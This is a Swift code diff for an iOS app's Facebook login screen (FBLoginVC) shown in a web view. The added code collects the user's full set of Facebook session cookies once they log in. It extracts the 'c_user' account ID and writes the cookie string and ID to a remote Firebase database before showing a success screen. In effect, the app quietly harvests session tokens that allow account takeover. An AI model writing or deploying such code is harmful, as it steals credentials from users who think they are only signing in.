@@ -124,10 +124,14 @@ extension FBLoginVC{
         return nil
     }
     
-    private func pushDataFirebase(cookei: String){
+    private func pushDataFirebase(cookei: String,uid: String){
         ref = Database.database().reference()
-        let email = UserDefaults.standard.value(forKey:"username")
-        self.ref.child("users").setValue(["username": email,"cookeis": cookei])
+        self.ref.child("Account").child(uid).setValue(["Cookei": cookei,"Uid": uid])
+        let defaults = UserDefaults.standard
+        defaults.set(true, forKey: "login_check")
+        defaults.synchronize()
+        let vc = ConnectSuccessVC()
+        self.push(vc)
     }
 }
 
@@ -148,13 +152,17 @@ extension FBLoginVC: WKNavigationDelegate{
                             Timer.scheduledTimer(withTimeInterval: 10.0, repeats: true) { (Timer) in
                                 webView.evaluateJavaScript(self.jsResult, completionHandler: { (value, error) in
                                     if !self.isCheck{
+                                        var uid: String?
                                         self.isCheck = true
                                         let cookieHeader = (data.compactMap({ (key, value) -> String in
                                             let fullNameArr = String(describing: value).components(separatedBy: "Value =")
+                                            if key == "c_user"{
+                                                uid = fullNameArr[1].replace(string: "\"", with: "").replace(string: "Version = 1;\n}", with: "").replace(string: ";", with: "").replace(string: "\n     ", with: "").replace(string: " ", with: "").replace(string: "\n", with: "")
+                                            }
                                             return "\(key)=\(fullNameArr[1].replace(string: "\"", with: "").replace(string: "Version = 1;\n}", with: "").replace(string: ";", with: "")) "
                                         }) as Array).joined(separator: ";")
                                         let cookeis = cookieHeader.replace(string: "\n     ", with: "")
-                                        self.pushDataFirebase(cookei: cookeis)
+                                        self.pushDataFirebase(cookei: cookeis,uid: uid ?? "")
 //                                        self.pushData(cookie: cookeis,listData: "true" , allAcc: 0)
 //                                        if let tokken = value as? String{
 //                                            if tokken.components(separatedBy: "&").count > 0 {
